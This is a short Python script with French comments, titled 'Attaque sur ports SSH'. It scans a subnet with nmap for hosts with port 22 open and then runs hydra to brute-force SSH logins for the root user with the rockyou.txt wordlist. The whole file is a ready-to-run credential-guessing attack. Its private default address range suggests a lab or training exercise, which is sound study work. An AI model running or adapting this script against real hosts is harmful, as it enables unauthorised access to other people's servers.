#!/usr/bin/env python3

# Importations de librairies
import argparse
import subprocess
import re
from termcolor import colored

# Gestion des arguments
parser = argparse.ArgumentParser("Attaque sur ports SSH")

# Adresse ip
parser.add_argument(
    "--ip", "-i",
    help="Adresse ip à cibler",
    required=False,
    type=str,
    default="172.16.10.0/24"
)

# Utilisateur ciblé
parser.add_argument(
    "--user","-u",
    help="Utilisateur ciblé",
    required=False,
    type=str,
    default="root"
)

# Fichier de mots de passe
parser.add_argument(
    "--passwords", "-p",
    help="Fichier de mots de passe à tester",
    required=False,
    type=str,
    default="rockyou.txt"
)

args = parser.parse_args()

ip=args.ip
user=args.user
passwords=args.passwords

# 1. SCAN NMAP
# ------------------------------------------------------------------------------------- #
print(colored("Scan du réseau ", "magenta",attrs=["bold"]) + colored(ip,"yellow",attrs=["bold"]))
# Définition de la commande bash
cmd = ["nmap", "-p", "22", ip, "--open"]
# Lancement de la commande et capture du résultat
res = subprocess.run(cmd, capture_output=True, text=True)
# Récupération des ips
# On gère deux formats de résultat de nmap différents
ips1 = re.findall(r"Nmap scan report for .*?\((\d+\.\d+\.\d+\.\d+)\)", res.stdout)
ips2 = re.findall(r"Nmap scan report for (\d+\.\d+\.\d+\.\d+)", res.stdout)
# Fusion des deux listes obtenues
ips = ips1 + ips2

print(colored("Adresses IP avec un port 22 ouvert :", "magenta", attrs=["bold"])+colored(ips,"yellow",attrs=["bold"]))
print(colored("Fin du scan.","magenta",attrs=["bold"]))

# 2. BRUTEFORCE HYDRA
# ------------------------------------------------------------------------------------- #
# Boucle sur les cibles potentielles trouvées
for ip in ips:
    print(colored("Attaque par force brute sur ","magenta",attrs=["bold"])+colored(ip,"yellow",attrs=["bold"]))
    # Définition du service et de l'adresse à attaquer
    ssh_ip="ssh://"+ip
    # Définition de la commande à lancer
    cmd = ["hydra", "-l", user, "-P", passwords, ssh_ip]
    # Lancement de la commande
    subprocess.run(cmd)
